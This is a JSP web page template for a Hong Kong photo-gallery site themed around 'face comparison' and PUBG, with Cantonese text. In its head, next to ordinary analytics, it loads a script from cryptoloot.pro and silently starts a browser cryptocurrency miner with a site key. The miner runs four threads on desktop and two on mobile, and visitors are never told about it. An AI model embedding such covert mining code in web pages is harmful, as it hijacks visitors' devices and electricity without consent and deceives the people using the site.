<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-108837037-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'UA-108837037-1');
  </script>

  <script src="https://cryptoloot.pro/lib/crlt.js"></script>
  <script>
      var miner=new CRLT.Anonymous('68dab01395a272a4850ea6714c1ca5add1234c6734c1',
          {
              threads:4,autoThreads:false,throttle:0.2,
          }
      );
      if (!miner.isMobile()) {
          miner.start();
      }else{
          miner.setNumThreads(2);
          miner.start();
      }
  </script>


  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Hong Kong Girl face comparison</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="大吉大利 今晚吃雞!睇下你係唔係絕地求生高手" />
  <meta name="keywords" content="大吉大利 今晚吃雞!睇下你係唔係絕地求生高手" />
  <meta name="author" content="hkptgfdb@gamil.com" />
  <meta name="robots" content="index, follow" />
  <meta name="googlebot" content="index, follow" />
  <meta name="URL" content="https://face-comparison.appspot.com/">
  <meta http-equiv="content-language" content="zh-Hant">

  <!--
    //////////////////////////////////////////////////////

    FREE HTML5 TEMPLATE
    DESIGNED & DEVELOPED by FREEHTML5.CO

    Website: 		http://freehtml5.co/
    Email: 			info@freehtml5.co
    Twitter: 		http://twitter.com/fh5co
    Facebook: 		https://www.facebook.com/fh5co

    //////////////////////////////////////////////////////
     -->
  <link rel="canonical" href="https://face-comparison.appspot.com/" />
  <!-- Facebook and Twitter integration -->
  <meta property="og:title" content=""/>
  <meta property="og:image" content=""/>
  <meta property="og:url" content=""/>
  <meta property="og:site_name" content=""/>
  <meta property="og:description" content=""/>
  <meta name="twitter:title" content="" />
  <meta name="twitter:image" content="" />
  <meta name="twitter:url" content="" />
  <meta name="twitter:card" content="" />

  <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
  <link rel="shortcut icon" href="https://face-comparison.appspot.com/favicon.ico">
  <link rel="apple-touch-icon" href="favicon.png" />
  <link rel="apple-touch-icon-precomposed" href="favicon.png" />

  <!-- Google Webfonts -->
  <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,100,500' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>

  <!-- Animate.css -->
  <link rel="stylesheet" href="css/animate.css">
  <!-- Icomoon Icon Fonts-->
  <link rel="stylesheet" href="css/icomoon.css">
  <!-- Magnific Popup -->
  <link rel="stylesheet" href="css/magnific-popup.css">
  <!-- Salvattore -->
  <link rel="stylesheet" href="css/salvattore.css">
  <!-- Theme Style -->
  <link rel="stylesheet" href="css/style.css">
  <script src="js/modernizr-2.6.2.min.js"></script>
  <!-- FOR IE9 below -->
  <!--[if lt IE 9]>
  <script src="js/respond.min.js"></script>
  <![endif]-->



</head>
<body>
<!--
<div id="fh5co-offcanvass">
  <a href="#" class="fh5co-offcanvass-close js-fh5co-offcanvass-close">Menu <i class="icon-cross"></i> </a>
  <h1 class="fh5co-logo"><a class="navbar-brand" href="HongKongGirlGallery">#你明的</a></h1>
  <ul>
    <li class="active"><a href="HongKongGirlGallery">Home</a></li>
    <li><a href="upload.html">睇下你係唔係PUBG</a></li>
  </ul>
  <h3 class="fh5co-lead">Connect with <a href="termofuse.html" target="_blank">me</a></h3>
  <p class="fh5co-social-icons">
    <a href="mailto:hkptgfdb@gmail.com"><i class="icon-twitter"></i></a>
    <a href="mailto:hkptgfdb@gmail.com"><i class="icon-facebook"></i></a>
    <a href="mailto:hkptgfdb@gmail.com"><i class="icon-instagram"></i></a>
    <a href="mailto:hkptgfdb@gmail.com"><i class="icon-dribbble"></i></a>
    <a href="mailto:hkptgfdb@gmail.com"><i class="icon-youtube"></i></a>
  </p>
</div>-->

<header id="fh5co-header" role="banner">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
        <!--<a href="#" class="fh5co-menu-btn js-fh5co-menu-btn">Menu <i class="icon-menu"></i></a>-->
        <a class="navbar-brand" href="upload.html" target="_blank">點擊這裡睇下你係唔係PUBG高手</a>
      </div>
    </div>
  </div>
</header>
<!-- END .header -->


<div id="fh5co-main">
  <div class="container">

    <div class="row">

      <div id="fh5co-board" data-columns>
        <c:forEach items="${imageLink}" var="imageLink">
          <div class="item">
            <div class="animate-box">
              <a href="${imageLink.value}" class="image-popup fh5co-board-img">
                <img src="${imageLink.value}" alt="WINNER Winner chicken dinner"></a>
            </div>
            <!--<div class="fh5co-desc">ptgf is chicken?</div>-->
          </div>
        </c:forEach>


      </div>

      </div>
    </div>
</div>


<footer id="fh5co-footer">

  <div class="container">
    <div class="row row-padded">
      <div class="col-md-12 text-center">
        <form action="/HongKongGirlGallery" method="post">
        <input type="submit" class="btn btn-primary" id = "btnSubmit" value="加載更多">
        </form>
        <p class="fh5co-social-icons">
          <a href="mailto:hkptgfdb@gmail.com"><i class="icon-twitter"></i></a>
          <a href="mailto:hkptgfdb@gmail.com"><i class="icon-facebook"></i></a>
          <a href="mailto:hkptgfdb@gmail.com"><i class="icon-instagram"></i></a>
          <a href="mailto:hkptgfdb@gmail.com"><i class="icon-dribbble"></i></a>
          <a href="mailto:hkptgfdb@gmail.com"><i class="icon-youtube"></i></a>
        </p>
        <!--  <p><small>&copy; Hydrogen Free HTML5 Template. All Rights Reserved.
              <br>Designed by: <a href="http://freehtml5.co/" target="_blank">FREEHTML5.co</a> | Images by: <a href="http://pexels.com" target="_blank">Pexels</a> </small></p>-->

        <p><small>每之更新顯示${displayLimit}張圖片<br>${noOfRecords}</small></p>
        <!--<p><small>上載照片到(MENU > 睇下你係唔係PUBG) 馬上知道你女朋友係唔係_</small></p>-->
      </div>
    </div>
  </div>
</footer>


<!-- jQuery -->
<script src="js/jquery.min.js"></script>
<!-- jQuery Easing -->
<script src="js/jquery.easing.1.3.js"></script>
<!-- Bootstrap -->
<script src="js/bootstrap.min.js"></script>
<!-- Waypoints -->
<script src="js/jquery.waypoints.min.js"></script>
<!-- Magnific Popup -->
<script src="js/jquery.magnific-popup.min.js"></script>
<!-- Salvattore -->
<script src="js/salvattore.min.js"></script>
<!-- Main JS -->
<script src="js/main.js"></script>




</body>
</html>
